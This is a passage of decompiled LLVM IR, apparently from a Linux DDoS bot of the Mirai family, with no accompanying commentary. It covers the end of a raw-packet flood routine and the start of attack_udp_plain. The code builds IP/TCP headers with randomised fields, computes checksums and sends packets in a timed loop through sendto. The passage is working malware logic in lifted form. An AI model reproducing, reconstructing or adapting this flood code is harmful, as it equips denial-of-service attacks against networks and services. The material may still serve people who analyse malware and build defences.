  %v4_804c11a = zext i8 %v3_804c11a to i32
  %v5_804c11a = load i32, i32* %eax.global-to-local, align 4
  %v6_804c11a = and i32 %v5_804c11a, -256
  %v5_804c11d = load i32, i32* %edx.global-to-local, align 4
  %v6_804c11d = and i32 %v5_804c11d, 268435200
  %v7_804c11d = or i32 %v6_804c11d, %v1_804c036
  %v4_804c11a.masked = and i32 %v4_804c11a, 192
  %v2_804c124 = mul nuw i32 %v7_804c11d, 16
  %v1_804c127 = load i32, i32* @edi, align 4
  %v5_804c129 = load i32, i32* @ecx, align 4
  %v6_804c129 = and i32 %v5_804c129, 536870656
  %v7_804c129 = or i32 %v6_804c129, %v1_804c041
  %v2_804c12f = mul nuw i32 %v7_804c129, 8
  %v6_804c132 = and i32 %v2_804c124, 1073737728
  %v7_804c132 = or i32 %v6_804c132, %v1_804c048
  %v2_804c136 = mul nuw i32 %v7_804c132, 4
  %v6_804c140 = and i32 %v2_804c136, 2147467264
  %v7_804c140 = or i32 %v6_804c140, %v1_804c057
  %v2_804c144 = mul nuw i32 %v7_804c140, 2
  store i32 %v2_804c144, i32* %edx.global-to-local, align 4
  %v1_804c127.masked32 = and i32 %v1_804c127, -16
  %v1_804c121 = or i32 %v4_804c11a.masked, %v1_804c062
  %v2_804c127.masked.masked = or i32 %v1_804c121, %v6_804c11a
  %v1_804c139.masked = or i32 %v2_804c127.masked.masked, %v1_804c127.masked32
  %v2_804c13c.masked = or i32 %v1_804c139.masked, %v2_804c124
  %v1_804c146 = or i32 %v2_804c13c.masked, %v2_804c12f
  %v2_804c149 = or i32 %v1_804c146, %v2_804c136
  %v6_804c14b18 = or i32 %v2_804c149, %v2_804c144
  %v6_804c14b = trunc i32 %v6_804c14b18 to i8
  store i32 %v6_804c14b18, i32* %eax.global-to-local, align 4
  store i8 %v6_804c14b, i8* %v2_804c11a, align 1
  %v0_804c152 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804c152 = add i32 %v0_804c152, 40
  %v2_804c152 = inttoptr i32 %v1_804c152 to i8*
  store i8 2, i8* %v2_804c152, align 1
  %v0_804c156 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804c156 = add i32 %v0_804c156, 41
  %v2_804c156 = inttoptr i32 %v1_804c156 to i8*
  store i8 4, i8* %v2_804c156, align 1
  %v0_804c15a = load i32, i32* %stack_var_-140, align 4
  %v1_804c15a = call i32 @rand_next(i32 %v0_804c15a)
  %v0_804c15f = load i32, i32* %ebx.global-to-local, align 4
  %v1_804c15f = add i32 %v0_804c15f, 44
  %v2_804c15f = inttoptr i32 %v1_804c15f to i8*
  store i8 4, i8* %v2_804c15f, align 1
  %v1_804c163 = urem i32 %v1_804c15a, 16
  store i32 %v1_804c163, i32* %eax.global-to-local, align 4
  %v0_804c166 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804c166 = add i32 %v0_804c166, 45
  %v2_804c166 = inttoptr i32 %v1_804c166 to i8*
  store i8 2, i8* %v2_804c166, align 1
  %v0_804c16a = load i32, i32* %eax.global-to-local, align 4
  %v1_804c16a = add i32 %v0_804c16a, 1400
  %v0_804c16f = load i32, i32* %ebx.global-to-local, align 4
  %v1_804c16f = add i32 %v0_804c16f, 46
  %v2_804c16f = inttoptr i32 %v1_804c16f to i8*
  store i8 8, i8* %v2_804c16f, align 1
  %v1_804c173 = trunc i32 %v1_804c16a to i16
  %v2_804c173 = call i16 @llvm.bswap.i16(i16 %v1_804c173)
  %v3_804c173 = zext i16 %v2_804c173 to i32
  %v5_804c173 = and i32 %v1_804c16a, -65536
  %v6_804c173 = or i32 %v3_804c173, %v5_804c173
  store i32 %v6_804c173, i32* %eax.global-to-local, align 4
  %v0_804c177 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804c177 = add i32 %v0_804c177, 47
  %v2_804c177 = inttoptr i32 %v1_804c177 to i8*
  store i8 10, i8* %v2_804c177, align 1
  %v0_804c17b = load i32, i32* %eax.global-to-local, align 4
  %v1_804c17b = trunc i32 %v0_804c17b to i16
  %v2_804c17b = load i32, i32* %ebx.global-to-local, align 4
  %v3_804c17b = add i32 %v2_804c17b, 42
  %v4_804c17b = inttoptr i32 %v3_804c17b to i16*
  store i16 %v1_804c17b, i16* %v4_804c17b, align 2
  %v0_804c17f = load i32, i32* %stack_var_-140, align 4
  %v1_804c17f = call i32 @rand_next(i32 %v0_804c17f)
  store i32 %v1_804c17f, i32* %eax.global-to-local, align 4
  %v0_804c184 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804c184 = add i32 %v0_804c184, 56
  %v2_804c184 = inttoptr i32 %v1_804c184 to i8*
  store i8 1, i8* %v2_804c184, align 1
  %v0_804c188 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804c188 = add i32 %v0_804c188, 57
  %v2_804c188 = inttoptr i32 %v1_804c188 to i8*
  store i8 3, i8* %v2_804c188, align 1
  %v0_804c18c = load i32, i32* %ebx.global-to-local, align 4
  %v1_804c18c = add i32 %v0_804c18c, 58
  %v2_804c18c = inttoptr i32 %v1_804c18c to i8*
  store i8 3, i8* %v2_804c18c, align 1
  %v0_804c190 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804c190 = add i32 %v0_804c190, 59
  %v2_804c190 = inttoptr i32 %v1_804c190 to i8*
  store i8 6, i8* %v2_804c190, align 1
  %v0_804c194 = load i32, i32* %eax.global-to-local, align 4
  %v1_804c194 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804c194 = add i32 %v1_804c194, 48
  %v3_804c194 = inttoptr i32 %v2_804c194 to i32*
  store i32 %v0_804c194, i32* %v3_804c194, align 4
  %v0_804c197 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804c197 = add i32 %v0_804c197, 52
  %v2_804c197 = inttoptr i32 %v1_804c197 to i32*
  store i32 0, i32* %v2_804c197, align 4
  %v3_804c19e = load i32, i32* %stack_var_-20, align 4
  %v1_804c1a2 = add i32 %v3_804c19e, 1
  store i32 %v1_804c1a2, i32* @ebx, align 4
  store i32 %v1_804c1a2, i32* %stack_var_-20, align 4
  %v5_804c1ab = icmp slt i32 %v1_804c1a2, %v4_804be69
  br i1 %v5_804c1ab, label %dec_label_pc_804c0d5.dec_label_pc_804c07f_crit_edge, label %dec_label_pc_804c1b1

dec_label_pc_804c0d5.dec_label_pc_804c07f_crit_edge: ; preds = %dec_label_pc_804c0d5
  br label %dec_label_pc_804c07f

dec_label_pc_804c1b1:                             ; preds = %dec_label_pc_804c0d5, %dec_label_pc_804c3ae
  store i32 0, i32* %stack_var_-20, align 4
  br i1 %v4_804c022, label %dec_label_pc_804c1b1.dec_label_pc_804c3ae_crit_edge, label %dec_label_pc_804c1c4

dec_label_pc_804c1b1.dec_label_pc_804c3ae_crit_edge: ; preds = %dec_label_pc_804c1b1
  br label %dec_label_pc_804c3ae

dec_label_pc_804c1c4:                             ; preds = %dec_label_pc_804c1b1
  store i32 0, i32* %eax.global-to-local, align 4
  %v13_804c1d0 = icmp eq i32 %v5_804bf9c, -1
  %v13_804c315 = icmp eq i16 %v6_804bebd, -1
  %v13_804c1e7 = icmp eq i16 %v6_804bef0, -1
  %v12_804c1fd = icmp eq i32 %v5_804bf15, 65535
  %v12_804c375 = icmp eq i32 %v5_804bf27, 65535
  %v4_804c219 = icmp eq i8 %v1_804c016, 0
  %v1_804c21e = icmp eq i1 %v4_804c219, false
  %v3_804c2e2 = add i32 %arg3, 20
  %v1_804c31e = icmp eq i1 %v13_804c315, false
  %v1_804c380 = icmp eq i1 %v12_804c375, false
  %v1_804c364 = icmp eq i1 %v12_804c1fd, false
  %v1_804c333 = icmp eq i1 %v13_804c1e7, false
  %v1_804c303 = icmp eq i1 %v13_804c1d0, false
  br label %dec_label_pc_804c2a0

dec_label_pc_804c1d0:                             ; preds = %dec_label_pc_804c2a0
  br i1 %v13_804c1d0, label %dec_label_pc_804c310, label %dec_label_pc_804c1db

dec_label_pc_804c1db:                             ; preds = %bb81, %dec_label_pc_804c1d0
  br i1 %v13_804c315, label %dec_label_pc_804c324, label %dec_label_pc_804c1e7

dec_label_pc_804c1e7:                             ; preds = %dec_label_pc_804c310, %dec_label_pc_804c1db
  br i1 %v13_804c1e7, label %dec_label_pc_804c340, label %dec_label_pc_804c1f3

dec_label_pc_804c1f3:                             ; preds = %dec_label_pc_804c324, %dec_label_pc_804c1e7
  %v0_804c1f3 = load i32, i32* @ebp, align 4
  %v1_804c1f3 = trunc i32 %v0_804c1f3 to i16
  %v11_804c1f3 = icmp eq i16 %v1_804c1f3, -1
  br i1 %v11_804c1f3, label %dec_label_pc_804c353, label %dec_label_pc_804c1fd

dec_label_pc_804c1fd:                             ; preds = %dec_label_pc_804c340, %dec_label_pc_804c1f3
  br i1 %v12_804c1fd, label %dec_label_pc_804c370, label %dec_label_pc_804c20b

dec_label_pc_804c20b:                             ; preds = %dec_label_pc_804c353, %dec_label_pc_804c1fd
  br i1 %v12_804c375, label %dec_label_pc_804c386, label %dec_label_pc_804c219

dec_label_pc_804c219:                             ; preds = %dec_label_pc_804c370, %dec_label_pc_804c20b
  br i1 %v1_804c21e, label %dec_label_pc_804c3a0, label %dec_label_pc_804c224

dec_label_pc_804c224:                             ; preds = %dec_label_pc_804c386, %dec_label_pc_804c219, %dec_label_pc_804c3a0
  %v0_804c224 = load i32, i32* @esi, align 4
  %v1_804c224 = add i32 %v0_804c224, 10
  %v2_804c224 = inttoptr i32 %v1_804c224 to i16*
  store i16 0, i16* %v2_804c224, align 2
  %v0_804c22e = load i32, i32* @esi, align 4
  store i32 %v0_804c22e, i32* %stack_var_-140, align 4
  %v2_804c22f = inttoptr i32 %v0_804c22e to i16*
  %v3_804c22f = call i32 @checksum_generic(i16* %v2_804c22f, i32 20)
  %v4_804c22f = trunc i32 %v3_804c22f to i16
  store i32 %v3_804c22f, i32* %eax.global-to-local, align 4
  %v3_804c234 = load i32, i32* @esi, align 4
  %v4_804c234 = add i32 %v3_804c234, 10
  %v5_804c234 = inttoptr i32 %v4_804c234 to i16*
  store i16 %v4_804c22f, i16* %v5_804c234, align 2
  %v0_804c238 = load i32, i32* @edi, align 4
  %v1_804c238 = add i32 %v0_804c238, 16
  %v2_804c238 = inttoptr i32 %v1_804c238 to i16*
  store i16 0, i16* %v2_804c238, align 2
  %v0_804c245 = load i32, i32* @edi, align 4
  %v0_804c246 = load i32, i32* @esi, align 4
  %v4_804c247 = inttoptr i32 %v0_804c245 to i16*
  %v5_804c247 = call i32 @checksum_tcpudp(i32 %v0_804c246, i16* %v4_804c247, i32 10240)
  %v6_804c247 = trunc i32 %v5_804c247 to i16
  store i32 %arg3, i32* %edx.global-to-local, align 4
  %v3_804c253 = load i32, i32* @edi, align 4
  %v4_804c253 = add i32 %v3_804c253, 16
  %v5_804c253 = inttoptr i32 %v4_804c253 to i16*
  store i16 %v6_804c247, i16* %v5_804c253, align 2
  %v3_804c257 = load i32, i32* %stack_var_-20, align 4
  %v0_804c264 = load i32, i32* %edx.global-to-local, align 4
  %v2_804c264 = mul i32 %v3_804c257, 24
  %v3_804c264 = add i32 %v0_804c264, %v2_804c264
  store i32 %v3_804c264, i32* %eax.global-to-local, align 4
  %v0_804c267 = load i32, i32* @edi, align 4
  %v1_804c267 = add i32 %v0_804c267, 2
  %v2_804c267 = inttoptr i32 %v1_804c267 to i16*
  %v3_804c267 = load i16, i16* %v2_804c267, align 2
  %v4_804c267 = zext i16 %v3_804c267 to i32
  %v6_804c267 = and i32 %v0_804c264, -65536
  %v7_804c267 = or i32 %v4_804c267, %v6_804c267
  store i32 %v7_804c267, i32* %edx.global-to-local, align 4
  %v3_804c26b = add i32 %v3_804c264, 2
  %v4_804c26b = inttoptr i32 %v3_804c26b to i16*
  store i16 %v3_804c267, i16* %v4_804c26b, align 2
  %v0_804c271 = load i32, i32* %eax.global-to-local, align 4
  store i32 %v0_804c271, i32* %stack_var_-140, align 4
  %v0_804c279 = load i32, i32* @esi, align 4
  store i32 %v3_804bfc5, i32* @ebx, align 4
  %v6_804c27f = call i32 @__libc_sendto(i32 %v3_804bfc5, i32 %v0_804c279, i32 60, i32 16384, i32 %v0_804c271, i32 16)
  %v3_804c284 = load i32, i32* %stack_var_-20, align 4
  %v1_804c28b = add i32 %v3_804c284, 1
  store i32 %v1_804c28b, i32* %eax.global-to-local, align 4
  store i32 %v1_804c28b, i32* %stack_var_-20, align 4
  %v5_804c29a = icmp slt i32 %v1_804c28b, %v4_804be69
  br i1 %v5_804c29a, label %dec_label_pc_804c2a0, label %dec_label_pc_804c3ae

dec_label_pc_804c2a0:                             ; preds = %dec_label_pc_804c224, %dec_label_pc_804c1c4
  %v0_804c2c4 = phi i32 [ %v1_804c28b, %dec_label_pc_804c224 ], [ 0, %dec_label_pc_804c1c4 ]
  store i32 %v3_804be99, i32* %edx.global-to-local, align 4
  %v2_804c2a4 = mul i32 %v0_804c2c4, 4
  %v3_804c2a4 = add i32 %v2_804c2a4, %v3_804be99
  %v4_804c2a4 = inttoptr i32 %v3_804c2a4 to i32*
  %v5_804c2a4 = load i32, i32* %v4_804c2a4, align 4
  store i32 %v5_804c2a4, i32* @esi, align 4
  store i32 %arg3, i32* %edx.global-to-local, align 4
  %v1_804c2b1 = add i32 %v5_804c2a4, 20
  store i32 %v1_804c2b1, i32* @edi, align 4
  %v2_804c2b4 = mul i32 %v0_804c2c4, 24
  %v3_804c2b4 = add i32 %v2_804c2b4, %arg3
  store i32 %v3_804c2b4, i32* %eax.global-to-local, align 4
  %v1_804c2b7 = add i32 %v3_804c2b4, 20
  %v2_804c2b7 = inttoptr i32 %v1_804c2b7 to i8*
  %v3_804c2b7 = load i8, i8* %v2_804c2b7, align 1
  %v6_804c2bb = icmp ugt i8 %v3_804c2b7, 31
  br i1 %v6_804c2bb, label %dec_label_pc_804c1d0, label %dec_label_pc_804c2c1

dec_label_pc_804c2c1:                             ; preds = %dec_label_pc_804c2a0
  %v1_804c2c1 = add i32 %v3_804c2b4, 16
  %v2_804c2c1 = inttoptr i32 %v1_804c2c1 to i32*
  %v3_804c2c1 = load i32, i32* %v2_804c2c1, align 4
  store i32 %v3_804c2c1, i32* %ebx.global-to-local, align 4
  %v1_804c2c4 = call i32 @rand_next(i32 %v0_804c2c4)
  store i32 %v1_804c2c4, i32* %eax.global-to-local, align 4
  %v1_804c2c9 = trunc i32 %v3_804c2c1 to i16
  %v2_804c2c9 = call i16 @llvm.bswap.i16(i16 %v1_804c2c9)
  %v3_804c2c9 = zext i16 %v2_804c2c9 to i32
  %v1_804c2cd = udiv i32 %v3_804c2c1, 65536
  %v2_804c2cd = mul nuw i32 %v3_804c2c9, 65536
  %v1_804c2d0 = trunc i32 %v1_804c2cd to i16
  %v2_804c2d0 = call i16 @llvm.bswap.i16(i16 %v1_804c2d0)
  %v3_804c2d0 = zext i16 %v2_804c2d0 to i32
  %v6_804c2d0 = or i32 %v3_804c2d0, %v2_804c2cd
  store i32 %v6_804c2d0, i32* %ebx.global-to-local, align 4
  %v3_804c2d4 = load i32, i32* %stack_var_-20, align 4
  store i32 %arg3, i32* %edx.global-to-local, align 4
  %v2_804c2e2 = mul i32 %v3_804c2d4, 24
  %v4_804c2e2 = add i32 %v3_804c2e2, %v2_804c2e2
  %v5_804c2e2 = inttoptr i32 %v4_804c2e2 to i8*
  %v6_804c2e2 = load i8, i8* %v5_804c2e2, align 1
  %tmp83 = urem i8 %v6_804c2e2, 32
  %v4_804c2ec = icmp eq i8 %tmp83, 0
  br i1 %v4_804c2ec, label %bb81, label %bb

bb:                                               ; preds = %dec_label_pc_804c2c1
  %v2_804c2ec = zext i8 %tmp83 to i32
  %v5_804c2ec = lshr i32 %v1_804c2c4, %v2_804c2ec
  store i32 %v5_804c2ec, i32* %eax.global-to-local, align 4
  br label %bb81

bb81:                                             ; preds = %dec_label_pc_804c2c1, %bb
  %v1_804c2ee = phi i32 [ %v1_804c2c4, %dec_label_pc_804c2c1 ], [ %v5_804c2ec, %bb ]
  %v2_804c2ee = add i32 %v1_804c2ee, %v6_804c2d0
  %v1_804c2f0 = trunc i32 %v2_804c2ee to i16
  %v2_804c2f0 = call i16 @llvm.bswap.i16(i16 %v1_804c2f0)
  %v3_804c2f0 = zext i16 %v2_804c2f0 to i32
  %v1_804c2f4 = udiv i32 %v2_804c2ee, 65536
  %v2_804c2f4 = mul nuw i32 %v3_804c2f0, 65536
  %v1_804c2f7 = trunc i32 %v1_804c2f4 to i16
  %v2_804c2f7 = call i16 @llvm.bswap.i16(i16 %v1_804c2f7)
  %v3_804c2f7 = zext i16 %v2_804c2f7 to i32
  %v6_804c2f7 = or i32 %v3_804c2f7, %v2_804c2f4
  %v1_804c300 = load i32, i32* @esi, align 4
  %v2_804c300 = add i32 %v1_804c300, 16
  %v3_804c300 = inttoptr i32 %v2_804c300 to i32*
  store i32 %v6_804c2f7, i32* %v3_804c300, align 4
  br i1 %v1_804c303, label %dec_label_pc_804c1db, label %.dec_label_pc_804c310_crit_edge

.dec_label_pc_804c310_crit_edge:                  ; preds = %bb81
  %v0_804c310.pre = load i32, i32* %stack_var_-20, align 4
  br label %dec_label_pc_804c310

dec_label_pc_804c310:                             ; preds = %.dec_label_pc_804c310_crit_edge, %dec_label_pc_804c1d0
  %v0_804c310 = phi i32 [ %v0_804c310.pre, %.dec_label_pc_804c310_crit_edge ], [ %v0_804c2c4, %dec_label_pc_804c1d0 ]
  %v1_804c310 = call i32 @rand_next(i32 %v0_804c310)
  store i32 %v1_804c310, i32* %eax.global-to-local, align 4
  %v1_804c31b = load i32, i32* @esi, align 4
  %v2_804c31b = add i32 %v1_804c31b, 12
  %v3_804c31b = inttoptr i32 %v2_804c31b to i32*
  store i32 %v1_804c310, i32* %v3_804c31b, align 4
  br i1 %v1_804c31e, label %dec_label_pc_804c1e7, label %dec_label_pc_804c324

dec_label_pc_804c324:                             ; preds = %dec_label_pc_804c310, %dec_label_pc_804c1db
  %v0_804c324 = load i32, i32* %stack_var_-20, align 4
  %v1_804c324 = call i32 @rand_next(i32 %v0_804c324)
  store i32 %v1_804c324, i32* %eax.global-to-local, align 4
  %v1_804c32f = trunc i32 %v1_804c324 to i16
  %v2_804c32f = load i32, i32* @esi, align 4
  %v3_804c32f = add i32 %v2_804c32f, 4
  %v4_804c32f = inttoptr i32 %v3_804c32f to i16*
  store i16 %v1_804c32f, i16* %v4_804c32f, align 2
  br i1 %v1_804c333, label %dec_label_pc_804c1f3, label %dec_label_pc_804c340

dec_label_pc_804c340:                             ; preds = %dec_label_pc_804c324, %dec_label_pc_804c1e7
  %v0_804c340 = load i32, i32* %stack_var_-20, align 4
  %v1_804c340 = call i32 @rand_next(i32 %v0_804c340)
  store i32 %v1_804c340, i32* %eax.global-to-local, align 4
  %v0_804c345 = load i32, i32* @ebp, align 4
  %v1_804c345 = trunc i32 %v0_804c345 to i16
  %v11_804c345 = icmp eq i16 %v1_804c345, -1
  %v1_804c349 = trunc i32 %v1_804c340 to i16
  %v2_804c349 = load i32, i32* @esi, align 4
  %v3_804c349 = add i32 %v2_804c349, 20
  %v4_804c349 = inttoptr i32 %v3_804c349 to i16*
  store i16 %v1_804c349, i16* %v4_804c349, align 2
  %v1_804c34d = icmp eq i1 %v11_804c345, false
  br i1 %v1_804c34d, label %dec_label_pc_804c1fd, label %dec_label_pc_804c353

dec_label_pc_804c353:                             ; preds = %dec_label_pc_804c340, %dec_label_pc_804c1f3
  %v0_804c353 = load i32, i32* %stack_var_-20, align 4
  %v1_804c353 = call i32 @rand_next(i32 %v0_804c353)
  store i32 %v1_804c353, i32* %eax.global-to-local, align 4
  %v1_804c360 = trunc i32 %v1_804c353 to i16
  %v2_804c360 = load i32, i32* @edi, align 4
  %v3_804c360 = add i32 %v2_804c360, 2
  %v4_804c360 = inttoptr i32 %v3_804c360 to i16*
  store i16 %v1_804c360, i16* %v4_804c360, align 2
  br i1 %v1_804c364, label %dec_label_pc_804c20b, label %dec_label_pc_804c370

dec_label_pc_804c370:                             ; preds = %dec_label_pc_804c353, %dec_label_pc_804c1fd
  %v0_804c370 = load i32, i32* %stack_var_-20, align 4
  %v1_804c370 = call i32 @rand_next(i32 %v0_804c370)
  store i32 %v1_804c370, i32* %eax.global-to-local, align 4
  %v1_804c37d = load i32, i32* @edi, align 4
  %v2_804c37d = add i32 %v1_804c37d, 4
  %v3_804c37d = inttoptr i32 %v2_804c37d to i32*
  store i32 %v1_804c370, i32* %v3_804c37d, align 4
  br i1 %v1_804c380, label %dec_label_pc_804c219, label %dec_label_pc_804c386

dec_label_pc_804c386:                             ; preds = %dec_label_pc_804c370, %dec_label_pc_804c20b
  %v0_804c386 = load i32, i32* %stack_var_-20, align 4
  %v1_804c386 = call i32 @rand_next(i32 %v0_804c386)
  store i32 %v1_804c386, i32* %eax.global-to-local, align 4
  %v1_804c390 = load i32, i32* @edi, align 4
  %v2_804c390 = add i32 %v1_804c390, 8
  %v3_804c390 = inttoptr i32 %v2_804c390 to i32*
  store i32 %v1_804c386, i32* %v3_804c390, align 4
  br i1 %v4_804c219, label %dec_label_pc_804c224, label %dec_label_pc_804c3a0

dec_label_pc_804c3a0:                             ; preds = %dec_label_pc_804c386, %dec_label_pc_804c219
  %v0_804c3a0 = load i32, i32* %stack_var_-20, align 4
  %v1_804c3a0 = call i32 @rand_next(i32 %v0_804c3a0)
  store i32 %v1_804c3a0, i32* %eax.global-to-local, align 4
  %v1_804c3a5 = trunc i32 %v1_804c3a0 to i16
  %v2_804c3a5 = load i32, i32* @edi, align 4
  %v3_804c3a5 = add i32 %v2_804c3a5, 18
  %v4_804c3a5 = inttoptr i32 %v3_804c3a5 to i16*
  store i16 %v1_804c3a5, i16* %v4_804c3a5, align 2
  br label %dec_label_pc_804c224

dec_label_pc_804c3ae.critedge:                    ; preds = %dec_label_pc_804c002
  store i32 0, i32* %stack_var_-20, align 4
  br label %dec_label_pc_804c3ae

dec_label_pc_804c3ae:                             ; preds = %dec_label_pc_804c224, %dec_label_pc_804c1b1.dec_label_pc_804c3ae_crit_edge, %dec_label_pc_804c3ae.critedge
  store i32 0, i32* %stack_var_-140, align 4
  %v2_804c3b3 = call i32 @__GI_time(i32* null)
  store i32 %v2_804c3b3, i32* %eax.global-to-local, align 4
  %v5_804c3bf = icmp slt i32 %v2_804bfb6, %v2_804c3b3
  br i1 %v5_804c3bf, label %dec_label_pc_804c3c5, label %dec_label_pc_804c1b1

dec_label_pc_804c3c5:                             ; preds = %dec_label_pc_804c3ae, %entry
  %v0_804c3cc = phi i32 [ %v2_804c3b3, %dec_label_pc_804c3ae ], [ 0, %entry ]
  store i32 %v0_804be63, i32* %ebx.global-to-local, align 4
  ret i32 %v0_804c3cc

dec_label_pc_804c3cd:                             ; preds = %dec_label_pc_804bfd8
  store i32 %v3_804bfc5, i32* @eax, align 4
  store i32 %v3_804bfc5, i32* %stack_var_-140, align 4
  %v1_804c3d5 = call i32 @__GI___libc_close(i32 %v3_804bfc5)
  store i32 %v1_804c3d5, i32* %eax.global-to-local, align 4
  store i32 %v0_804be63, i32* %ebx.global-to-local, align 4
  ret i32 %v1_804c3d5

; uselistorder directives
  uselistorder i8 %tmp83, { 1, 0 }
  uselistorder i32 %v0_804c2c4, { 2, 3, 0, 1 }
  uselistorder i32 %v1_804c28b, { 1, 0, 2, 3 }
  uselistorder i32 %v0_804c264, { 1, 0 }
  uselistorder i1 %v12_804c375, { 1, 0 }
  uselistorder i1 %v13_804c315, { 1, 0 }
  uselistorder i32 %v1_804c16a, { 1, 0 }
  uselistorder i32 %v2_804c144, { 1, 0 }
  uselistorder i32 %v2_804c136, { 1, 0 }
  uselistorder i32 %v2_804c124, { 1, 0 }
  uselistorder i32 %v1_804c062, { 1, 0 }
  uselistorder i32 %v3_804bfc5, { 4, 3, 2, 1, 0, 6, 5, 7 }
  uselistorder i32 %v5_804bef0, { 0, 2, 1 }
  uselistorder i32 %v5_804bede, { 1, 0 }
  uselistorder i32 %v5_804becc, { 1, 0, 2 }
  uselistorder i32 %v5_804bebd, { 0, 2, 1 }
  uselistorder i32 %v3_804be99, { 0, 4, 1, 3, 2, 5 }
  uselistorder i32 %v4_804be69, { 2, 3, 1, 4, 0 }
  uselistorder i32 %v0_804be63, { 1, 0 }
  uselistorder i32* %stack_var_-140, { 2, 3, 4, 5, 1, 0, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17 }
  uselistorder i32* %stack_var_-20, { 1, 2, 7, 6, 5, 4, 3, 0, 8, 9, 10, 11, 12, 13, 14, 15, 16, 19, 17, 18 }
  uselistorder i32* %edx.global-to-local, { 0, 4, 5, 1, 2, 3, 6, 7, 8, 9, 10, 11, 12, 13, 14 }
  uselistorder i32* %ebx.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 15, 9, 10, 11, 12, 20, 13, 14, 16, 17, 18, 19, 25, 21, 22, 23, 24, 26 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 14, 15, 10, 11, 12, 13, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42 }
  uselistorder i32 %arg3, { 5, 0, 4, 3, 6, 1, 2 }
  uselistorder i8 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804c3ae, { 2, 0, 1 }
  uselistorder label %bb81, { 1, 0 }
  uselistorder label %dec_label_pc_804c224, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804c1b1, { 1, 0 }
  uselistorder label %dec_label_pc_804c0d5, { 1, 0 }
}

define i32 @attack_udp_plain(i32 %arg1, i8 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %v0_804c3f3 = load i32, i32* @ebx, align 4
  %v4_804c3f7 = zext i8 %arg2 to i32
  %v5_804c3f7 = load i32, i32* @eax, align 4
  %v6_804c3f7 = and i32 %v5_804c3f7, -256
  %v7_804c3f7 = or i32 %v6_804c3f7, %v4_804c3f7
  store i32 %v7_804c3f7, i32* %eax.global-to-local, align 4
  store i32 %arg5, i32* @esi, align 4
  %v4_804c401 = urem i32 %arg4, 256
  %v6_804c401 = and i32 %v0_804c3f3, -256
  %v7_804c401 = or i32 %v6_804c401, %v4_804c401
  store i32 %v7_804c401, i32* @ebx, align 4
  %v2_804c405 = icmp eq i8 %arg2, 0
  store i32 %v4_804c3f7, i32* %edx.global-to-local, align 4
  store i32 %v4_804c3f7, i32* %stack_var_-92, align 4
  %v2_804c416 = zext i8 %arg2 to i64
  %v3_804c416 = call i32 @calloc(i64 %v2_804c416, i32 4)
  store i32 %v4_804c3f7, i32* @ebp, align 4
  store i32 4, i32* %eax.global-to-local, align 4
  store i32 %v4_804c401, i32* @ebx, align 4
  store i32 %v4_804c3f7, i32* @edi, align 4
  store i32 %v4_804c3f7, i32* %stack_var_-92, align 4
  %v3_804c42e = call i32 @calloc(i64 %v2_804c416, i32 4)
  store i32 %v3_804c42e, i32* @eax, align 4
  %v0_804c43e = load i32, i32* @esi, align 4
  %v0_804c43f = load i32, i32* @ebx, align 4
  %v4_804c440 = trunc i32 %v0_804c43f to i8
  %v5_804c440 = call i32 @attack_get_opt_int(i8 %v4_804c440, i32 %v0_804c43e, i32 7, i32 65535)
  store i32 %v5_804c440, i32* @eax, align 4
  %sext = mul i32 %v5_804c440, 65536
  %v1_804c448 = sdiv i32 %sext, 65536
  store i32 %v1_804c448, i32* @ebp, align 4
  %v0_804c451 = load i32, i32* @esi, align 4
  %v0_804c452 = load i32, i32* @ebx, align 4
  store i32 %v0_804c452, i32* %stack_var_-92, align 4
  %v4_804c453 = trunc i32 %v0_804c452 to i8
  %v5_804c453 = call i32 @attack_get_opt_int(i8 %v4_804c453, i32 %v0_804c451, i32 6, i32 65535)
  store i32 %v5_804c453, i32* @eax, align 4
  %v1_804c45d = trunc i32 %v5_804c453 to i16
  store i32 %v5_804c453, i32* @edi, align 4
  %v0_804c461 = load i32, i32* @esi, align 4
  %v0_804c462 = load i32, i32* @ebx, align 4
  %v4_804c463 = trunc i32 %v0_804c462 to i8
  %v5_804c463 = call i32 @attack_get_opt_int(i8 %v4_804c463, i32 %v0_804c461, i32 0, i32 512)
  store i32 %v5_804c463, i32* @eax, align 4
  %v0_804c474 = load i32, i32* @esi, align 4
  %v0_804c475 = load i32, i32* @ebx, align 4
  store i32 %v0_804c475, i32* %stack_var_-92, align 4
  %v4_804c476 = trunc i32 %v0_804c475 to i8
  %v5_804c476 = call i32 @attack_get_opt_int(i8 %v4_804c476, i32 %v0_804c474, i32 1, i32 1)
  %v6_804c476 = trunc i32 %v5_804c476 to i8
  store i32 %v5_804c476, i32* %eax.global-to-local, align 4
  store i32 0, i32* %stack_var_-32, align 4
  store i32 0, i32* %stack_var_-92, align 4
  %v2_804c4a6 = call i32 @__GI_time(i32* null)
  %v2_804c4af = add i32 %v2_804c4a6, %arg1
  store i32 %v2_804c4af, i32* %eax.global-to-local, align 4
  %v12_804c4b8 = icmp eq i16 %v1_804c45d, -1
  br i1 %v12_804c4b8, label %dec_label_pc_804c65a, label %dec_label_pc_804c4c2

dec_label_pc_804c4c2:                             ; preds = %entry
  %v3_804c4c2 = call i16 @llvm.bswap.i16(i16 %v1_804c45d)
  br label %dec_label_pc_804c4cb

dec_label_pc_804c4cb:                             ; preds = %dec_label_pc_804c65a, %dec_label_pc_804c4c2
  %storemerge = phi i16 [ %v1_804c65f, %dec_label_pc_804c65a ], [ %v3_804c4c2, %dec_label_pc_804c4c2 ]
